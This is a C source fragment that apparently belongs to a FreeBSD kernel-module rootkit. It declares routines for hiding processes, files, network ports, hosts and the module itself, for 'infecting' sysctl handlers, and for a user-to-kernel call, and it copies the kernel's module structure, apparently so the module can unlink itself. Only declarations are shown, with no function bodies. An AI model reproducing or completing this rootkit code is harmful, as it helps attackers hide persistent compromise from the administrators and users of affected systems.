#include "needed.h"

MALLOC_DEFINE (HIDDEN_FILES, "hfile", "struct");
MALLOC_DEFINE (HIDDEN_PIDS, "hpid", "struct");
MALLOC_DEFINE (HIDDEN_PORTS, "hport", "struct");
MALLOC_DEFINE (HIDDEN_HOSTS, "hh", "struct");
MALLOC_DEFINE (PIDS, "pids", "int");
MALLOC_DEFINE (FILENAMES, "filenames", "char");


static int module_ops (struct module*, int, void*);
static int start_module (void);
static int end_module (void);
static int check_proc (struct proc *p, int recursive);
static int infect_oid (int *name, int size, int (*infected_func)(SYSCTL_HANDLER_ARGS), int (**old_func)(SYSCTL_HANDLER_ARGS));
static struct protected_pids* check_pid (int pid);
static int hide_pid (int pid);
static int unhide_pid (struct protected_pids *pp);
static struct hidden_files* check_file (char *filename);
static int hide_file (char *filename);
static int unhide_file (struct hidden_files *pf);
static struct protected_hosts* check_ip (u_int ip);
static u_int hide_ip (u_int ip);
static int unhide_ip (struct protected_hosts *ph);
static struct protected_ports* check_port (u_short port);
static int hide_port (u_short port);
static int unhide_port (struct protected_ports *port);
static int u2k (struct proc *p, struct u2k_args *uap);
static int hide_link_file (int id);


typedef TAILQ_HEAD(, module) modulelist_t; 

struct module
{	TAILQ_ENTRY(module) link; 
	TAILQ_ENTRY(module) flink; 
	struct linker_file *file; 
	int refs; 
	int id; 
	char *name; 
	modeventhand_t handler; 
	void *arg; 
	modspecific_t data; 
};
